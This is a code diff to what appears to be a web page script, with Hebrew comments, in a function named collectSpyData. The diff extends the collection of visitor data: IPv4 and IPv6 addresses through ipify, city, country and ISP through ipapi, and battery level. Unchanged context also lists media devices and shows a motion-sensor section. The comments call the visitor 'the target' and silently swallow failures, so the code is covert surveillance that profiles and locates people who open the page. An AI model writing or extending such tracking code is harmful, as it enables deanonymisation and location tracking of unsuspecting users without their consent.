@@ -92,13 +92,46 @@
 
         // --- 1. DATA EXTRACTION LOGIC ---
         async function collectSpyData() {
-            let ip = 'unknown', isp = 'unknown', loc = 'unknown';
-            try {
-                const r = await fetch('https://ipapi.co/json/');
-                const j = await r.json();
-                ip = j.ip; isp = j.org || "Unknown ISP"; loc = `${j.city}, ${j.country_name}`;
-            } catch (e) { }
+            let ipv4 = 'unknown', ipv6 = 'None', isp = 'unknown', loc = 'unknown';
 
+            // שלב 1: משיכת IPv4 ודאית
+            try {
+                const res4 = await fetch('https://api4.ipify.org?format=json');
+                const data4 = await res4.json();
+                ipv4 = data4.ip;
+            } catch (e) { console.error("IPv4 fetch failed"); }
+
+            // שלב 2: משיכת IPv6 (שמנו ב-try/catch נפרד כי זה יקרוס למשתמשים בלי תמיכה)
+            try {
+                // טיימר קצר כדי שלא נתקע את הסקריפט למשתמשים שאין להם ניתוב ל-v6
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+
+                const res6 = await fetch('https://api6.ipify.org?format=json', { signal: controller.signal });
+                clearTimeout(timeoutId);
+
+                const data6 = await res6.json();
+                ipv6 = data6.ip;
+            } catch (e) {
+                // מתעלמים בשקט. רוב הסיכויים שלמטרה פשוט אין חיבור IPv6 פעיל.
+            }
+
+            // עיצוב התצוגה לקונסולה
+            let displayIp = `v4: ${ipv4}`;
+            if (ipv6 !== 'None') {
+                displayIp += `\nv6: ${ipv6}`; // הוספנו ירידת שורה כדי שזה לא ישבור את הטבלה
+            }
+
+            // שלב 3: חילוץ מיקום גיאוגרפי וספקית על בסיס ה-IPv4 (שהוא אמין יותר למיקומים)
+            try {
+                const targetIpForGeo = ipv4 !== 'unknown' ? ipv4 : '';
+                const geoRes = await fetch(`https://ipapi.co/${targetIpForGeo}/json/`);
+                const geoData = await geoRes.json();
+                isp = geoData.org || "Unknown ISP";
+                loc = `${geoData.city}, ${geoData.country_name}`;
+            } catch (e) { console.error("Geo Fetch Error:", e); }
+
+            // טלמטריה של חומרה
             let battery = 'unknown';
             try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch (e) { }
 
@@ -108,7 +141,8 @@
                 mediaDevices = devs.map(d => `${d.kind.substring(0, 3)}: ${d.label || 'Hidden'}`);
             } catch (e) { }
 
-            return { ip, isp, location: loc, battery, mediaDevices };
+            // מחזירים את המחרוזת המשולבת לתוך האובייקט
+            return { ip: displayIp, isp, location: loc, battery, mediaDevices };
         }
 
         // --- PHYSICAL MOTION SENSORS (GYRO & COMPASS) ---
